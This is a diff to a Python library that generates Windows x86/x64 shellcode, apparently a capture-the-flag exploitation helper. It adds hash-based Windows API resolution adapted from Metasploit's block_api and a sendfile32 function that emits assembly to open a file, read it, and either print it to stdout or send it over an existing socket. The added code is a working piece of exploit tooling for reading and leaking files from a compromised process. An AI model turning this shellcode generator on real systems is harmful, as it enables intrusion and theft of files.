@@ -1,4 +1,4 @@
-import tempfile, subprocess, os
+import tempfile, subprocess, os, re, struct
 
 NASM = 'C:/Program Files/NASM/nasm.exe'
 def nasm_win(code, nasm_path=NASM):
@@ -44,27 +44,27 @@ def hash_func(func, w=64):
     func += '\0'
     return hash(func, w)
 
-def hash_both(mod, func, w=64):
+def _hash_both(mod, func, w=64):
     return (hash_mod(mod, w) + hash_func(func, w)) & ((1<<w)-1)
 
 def hash64(func):
     mod, func = func.split('!')
-    return hash_both(mod, func, 64)
+    return _hash_both(mod, func, 64)
 
 def hash32(func):
     mod, func = func.split('!')
-    return hash_both(mod, func, 32)
+    return _hash_both(mod, func, 32)
 
 assert hash_mod('wctfdb.exe') == 0xc0af8b40ac01f634
 assert hash_mod('ntdll.dll') == 0x80980b20be020c2e
 assert hash_mod('USER32.DLL') == 0x408e8aa8b1821630
 assert hash_func('wvsprintfW') == 0x448027815b0a9052
 assert hash_func('MessageBoxA') == 0xc43e2a215107b84b
-assert hash_both('ntdll', 'wcstoul') == 0x058437419c094c67
+assert _hash_both('ntdll', 'wcstoul') == 0x058437419c094c67
 assert hash64('ntdll!wcstoul') == 0x058437419c094c67
-assert hash_both('user32', 'wvsprintfW') == 0x850eb22a0c8ca682
-assert hash_both('user32', 'MessageBoxA') == 0x04ccb4ca0289ce7b
-assert hash_both('kernel32', 'lstrcmpiW', 32) == 0x6a396fcc
+assert _hash_both('user32', 'wvsprintfW') == 0x850eb22a0c8ca682
+assert _hash_both('user32', 'MessageBoxA') == 0x04ccb4ca0289ce7b
+assert _hash_both('kernel32', 'lstrcmpiW', 32) == 0x6a396fcc
 assert hash32('kernel32!lstrcmpiW') == 0x6a396fcc
 
 # adapted from https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm.
@@ -264,51 +264,75 @@ get_next_mod1:           ;
   jmp short next_mod     ; Process this module
 '''
 
-'''
-; read file, x86
+def _resolve(sc, w=64):
+    if w == 64:
+        repl = lambda x: 'mov r10, %d \n call api_call \n' % hash64(x.group(1))
+    else:
+        assert w==32
+        repl = lambda x: 'push %d \n call api_call \n' % hash32(x.group(1))
+    return re.sub(r'WINAPI\(([^)]+)\)', repl, sc)
 
-xor eax, eax
-push eax
-push '.txt'
-push 'flag'
-mov ebx, esp
-sub esp, 0x100
+def resolve32(sc):
+    return _resolve(sc, 32)
 
-push 0 ; OF_READ
-push esp ; &info
-push ebx ; path
-push {OpenFile}  ; kernel32!OpenFile
-call api_call
+def resolve64(sc):
+    return _resolve(sc, 64)
 
-mov ebp, esp
+def sendfile32(filename, socket=None):
+    sc = r'''
+    ; read file, x86
 
-push 0 ; opt
-push 0 ; opt
-push 0x100 ; size
-push ebp ; buffer
-push eax ; handle
-push {ReadFile}  ; kernel32!ReadFile
-call api_call
+    xor eax, eax
+    push eax
+    '''
 
-; for STDOUT
-push -11 ; STD_OUTPUT_HANDLE
-push {GetStdHandle} ; kernel32!GetStdHandle
-call api_call
+    filename += '\0'*4
+    parts = []
+    for i in range(0, len(filename), 4):
+        parts.append(struct.unpack("<I", filename[i:i+4])[0])
+    for part in parts[::-1]:
+        if part != '\0'*4:
+            sc += 'push %d\n' % part
 
-push 0 ; opt
-push 0 ; opt
-push 0x100  ; size
-push ebp  ; buffer
-push eax  ; handle
-push {WriteFile}  ; kernel32!WriteFile
-call api_call
+    sc += r'''
+    mov ebx, esp
+    sub esp, 0x100
 
-; for socket
-push 0     ; flags
-push 0x100 ; size
-push ebp   ; buffer
-push 3     ; sock
-push {send} ; ws2_32!send
-call api_call
+    push 0 ; OF_READ
+    push esp ; &info
+    push ebx ; path
+    WINAPI(kernel32!OpenFile)
 
-'''
+    mov ebp, esp
+
+    push 0 ; opt
+    push 0 ; opt
+    push 0x100 ; size
+    push ebp ; buffer
+    push eax ; handle
+    WINAPI(kernel32!ReadFile)
+    '''
+
+    if socket is None:
+        sc += r'''
+            push -11 ; STD_OUTPUT_HANDLE
+            WINAPI(kernel32!GetStdHandle)
+
+            push 0 ; opt
+            push 0 ; opt
+            push 0x100  ; size
+            push ebp  ; buffer
+            push eax  ; handle
+            WINAPI(kernel32!WriteFile)
+            '''
+    else:
+        sc += r'''
+        mov ecx, {socket}
+        ; for socket
+        push 0     ; flags
+        push 0x100 ; size
+        push ebp   ; buffer
+        push ecx   ; sock
+        WINAPI(ws2_32!send)
+        '''.format(socket=socket)
+    return resolve32(sc)
